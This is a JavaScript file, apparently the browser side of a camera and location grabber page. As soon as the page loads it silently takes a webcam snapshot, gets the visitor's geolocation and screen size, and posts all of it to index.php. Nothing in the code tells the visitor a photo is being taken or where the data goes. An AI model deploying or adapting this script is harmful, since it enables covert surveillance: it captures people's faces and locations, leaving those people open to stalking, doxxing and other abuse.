const larguraTela = window.innerWidth;
const alturaTela = window.innerHeight;

function enviarDados(largura, altura, latitude, longitude, imagem = null) {
    const dados = {
        larguraTela: largura,
        alturaTela: altura,
        latitude: latitude,
        longitude: longitude
    };

    const formData = new FormData();
    formData.append('dados', JSON.stringify(dados));
    if (imagem) {
        formData.append('imagem', imagem, 'captura.jpg');
    }

    fetch('index.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log('Resposta do servidor:', data);
    })
    .catch(error => {
        console.error('Erro ao enviar os dados:', error);
    });
}

enviarDados(larguraTela, alturaTela, null, null);

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            enviarDados(null, null, latitude, longitude);
        },
        (error) => {
            console.error(error.message);
        }
    );
}

function capturarFoto() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.addEventListener('canplay', () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob((blob) => {
                    enviarDados(null, null, null, null, blob);
                }, 'image/jpeg');
            });
        })
        .catch(error => {
            console.error('Erro ao acessar a câmera:', error);
        });
}

window.addEventListener('load', capturarFoto);
